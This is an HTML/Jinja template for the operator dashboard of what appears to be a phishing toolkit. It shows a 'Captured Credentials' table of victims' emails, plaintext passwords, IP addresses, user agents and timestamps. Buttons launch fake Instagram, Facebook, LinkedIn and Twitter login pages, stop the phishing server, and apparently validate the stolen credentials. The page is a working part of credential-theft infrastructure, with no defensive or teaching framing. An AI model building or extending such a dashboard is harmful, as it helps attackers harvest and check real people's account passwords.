<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">>
  <title>Captured Credentials</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      padding: 2em;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: white;
    }
    th, td {
      padding: 0.7em;
      border: 1px solid #ccc;
    }
    th {
      background-color: #007bff;
      color: white;
    }
    tr:nth-child(even) {
      background-color: #f8f8f8;
    }
    .logout, .actions {
      margin-top: 1em;
    }
    .actions button {
      margin-top: 2em;
      padding: 0.5em 1em;
      border: none;
      background-color: #007bff;
      color: white;
      cursor: pointer;
      border-radius: 5px;
    }
    .actions button.stop {
      background-color: #dc3545;
    }
    .validate {
      background-color: #28a745;
    }
  </style>
</head>
<body>
  <h2>Captured Credentials</h2>

  <div class="actions">
    <form action="/launch/instagram" method="GET" style="display:inline;">
      <button type="submit">Launch Instagram</button>
    </form>
    <form action="/launch/facebook" method="GET" style="display:inline;">
      <button type="submit">Launch Facebook</button>
    </form>
    <form action="/launch/linkedin" method="GET" style="display:inline;">
      <button type="submit">Launch Linkedin</button>
    </form>
    <form action="/launch/twitter" method="GET" style="display:inline;">
      <button type="submit">Launch Twitter</button>
    </form>
    <form action="/stop_phishing" method="GET" style="display:inline;">
      <button type="submit" class="stop">Stop Server</button>
    </form>
    <form action="/validate_now" method="GET" style="display:inline;">
      <button type="submit" class="validate">Validate now</button>
    </form>
  </div>

  <table>
    <tr>
      <th>ID</th>
      <th>Email</th>
      <th>Password</th>
      <th>IP</th>
      <th>User-Agent</th>
      <th>Timestamp</th>
      <th>Status</th>
    </tr>
    {% for row in credentials %}
    <tr>
      <td>{{ row[0] }}</td>
      <td>{{ row[1] }}</td>
      <td>{{ row[2] }}</td>
      <td>{{ row[3] }}</td>
      <td>{{ row[4] }}</td>
      <td>{{ row[5] }}</td>
      <td>{{ row[6] }}</td>
    </tr>
    {% endfor %}
  </table>

  <div class="logout">
    <a href="{{ url_for('routes.logout') }}">Logout</a>
  </div>
</body>
</html>
